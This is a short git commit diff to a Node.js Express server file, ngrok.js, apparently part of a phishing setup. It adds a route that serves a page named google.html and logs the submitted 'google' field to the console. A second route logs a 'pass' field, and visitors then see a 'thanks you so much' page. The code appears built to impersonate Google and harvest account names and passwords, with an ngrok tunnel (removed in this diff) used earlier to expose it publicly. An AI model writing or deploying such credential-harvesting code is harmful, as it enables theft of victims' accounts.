16b0afc27a92895b27bdb9de4c80e31a8ebe7184
SoorajSunkar <soorajsunkar@gmail.com>
2023-01-14 15:44:15 +0630

    hi

--- ngrok.js
+++ ngrok.js
@@ -2,6 +2,7 @@ const http = require('http');
 const ngrok = require('ngrok');
 
 const express = require('express');
+const { copyFileSync } = require('fs');
 const app = express();
 
 app.use(express.urlencoded())
@@ -21,25 +22,31 @@ app.post('/',(req,res)=>{
     res.redirect('/number')
 })
 
+app.get('/google',(req,res)=>{
+    console.log('gogle');
+    res.sendFile(`${__dirname}/google.html`);
+
+})
+
+app.post('/google',(req,res)=>{
+    console.log(req.body.google);
+    res.redirect('/number')
+    
+})
+
 app.post('/number',(req,res)=>{
     console.log(req.body.pass)
-    res.redirect('/')
+    res.redirect('/text')
+})
+
+app.get('/text',(req,res)=>{
+    res.send("<h1> thanks you so much </h1>")
 })
 const port = 4000;
 
 
 app.listen(port, (err)=>{
     if (err) return console.log(`Something bad happened: ${err}`);
-    console.log(`Node.js server listening on ${port}`);
-
-    ngrok.connect(port, function (err, url) {
-        console.log(`Node.js local server is publicly-accessible at ${url}`);
-        if(err){
-            console.log(err)
-        }
-        else{
-            console.log('its working');
-        }
-    });
+    // console.log(`Node.js server listening on ${port}`);
 
 });
